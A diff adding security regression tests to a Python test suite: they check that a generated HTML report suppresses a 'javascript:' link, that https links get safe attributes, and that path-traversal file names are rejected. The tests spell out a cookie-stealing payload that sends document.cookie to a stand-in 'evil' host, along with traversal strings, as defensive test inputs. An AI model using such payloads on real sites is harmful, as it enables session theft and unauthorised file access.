@@ -14,9 +14,13 @@ from openpyxl import load_workbook
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
+import pytest
+
 import domain
+import drive_sync
 import offline
 import provenance
+import report as report_mod
 
 
 # --------------------------------------------------------------------------- #
@@ -121,6 +125,39 @@ def test_scan_and_safe_upload(tmp_path):
     safe, blocked = provenance.safe_upload_list([str(bad), str(good), str(binary)])
     assert str(good) in safe and str(binary) in safe
     assert any(str(bad) == b[0] for b in blocked)
+
+
+# --------------------------------------------------------------------------- #
+# security regressions
+# --------------------------------------------------------------------------- #
+def _report_html_for_link(tmp_path, link):
+    rows = [{"sheet": "S", "row": 2, "status": "ok", "confidence": 0.9,
+             "consensus_label": "", "changed_fields": [], "review_needed": False,
+             "viewer_method": "image", "notes": "", "color": "green", "link": link}]
+    out = report_mod.build_report(str(tmp_path / "r.html"), "wb", "t",
+                                  {"linked_rows": 1}, rows, total_cost=0.0)
+    return open(out, encoding="utf-8").read()
+
+
+def test_report_suppresses_javascript_link(tmp_path):
+    # A malicious hyperlink from an untrusted workbook must NOT become clickable.
+    h = _report_html_for_link(tmp_path, "javascript:fetch('//evil/'+document.cookie)")
+    assert 'href="javascript:' not in h
+    assert "non-web link suppressed" in h
+
+
+def test_report_allows_https_link(tmp_path):
+    h = _report_html_for_link(tmp_path, "https://county.example.com/doc/1")
+    assert 'href="https://county.example.com/doc/1"' in h
+    assert 'rel="noopener noreferrer"' in h
+
+
+def test_drive_safe_basename_blocks_traversal():
+    assert drive_sync._safe_basename("report.xlsx") == "report.xlsx"
+    for bad in ("../../etc/evil.xlsx", "../x.xlsx", "a/b/c.xlsx",
+                "..\\..\\win.xlsx", ".."):
+        with pytest.raises(ValueError):
+            drive_sync._safe_basename(bad)
 
 
 def test_build_manifest(tmp_path):
